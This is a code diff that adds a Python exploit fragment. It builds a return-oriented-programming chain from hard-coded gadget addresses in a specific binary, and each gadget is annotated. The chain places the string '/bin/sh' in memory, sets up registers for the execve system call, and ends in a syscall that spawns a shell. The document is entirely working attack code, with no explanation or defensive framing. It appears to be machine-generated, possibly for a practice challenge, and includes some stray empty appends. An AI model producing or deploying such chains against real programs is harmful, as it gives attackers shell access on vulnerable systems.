@@ -1,0 +1,25 @@
+payload = p64(0x4168dd)
+#0x00000000004168dd: pop rdi; pop rbp; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x46e078)+p64(0x435ffa)
+# 0x0000000000435ffa: mov qword ptr [rbp - 8], rdi; mov eax, 1; pop rbp; ret; 
+payload += p64(0x0)+p64(0x43733d)
+# 0x000000000043733d: pop rcx; std; dec ecx; ret; 
+payload += p64(0x4168de)+p64(0x443ba2)
+# 0x0000000000443ba2: xchg eax, ecx; cld; dec ecx; ret; 
+payload += p64(0x424afb)
+# 0x0000000000424afb: mov esi, 0; mov rdi, rcx; call rax; 
+payload += b''
+# 0x00000000004168dd: pop rdi; pop rbp; ret; 
+payload += p64(0x0)+p64(0x41bab8)
+# 0x000000000041bab8: pop rax; pop rbx; pop rbp; ret; 
+payload += p64(0x1)+p64(0x0)+p64(0x0)+p64(0x43e609)
+# 0x000000000043e609: movabs rdx, 0x431bde82d7b634db; mul rdx; mov rax, rdx; shr rax, 0x12; pop rbp; ret; 
+payload += p64(0x0)+p64(0x4168dd)
+# 0x00000000004168dd: pop rdi; pop rbp; ret; 
+payload += p64(0x46e070)+p64(0x0)+p64(0x43733d)
+# 0x000000000043733d: pop rcx; std; dec ecx; ret; 
+payload += p64(0x3c)+p64(0x443ba2)
+# 0x0000000000443ba2: xchg eax, ecx; cld; dec ecx; ret; 
+payload += p64(0x403644)
+# 0x0000000000403644: syscall; 
+payload += b''
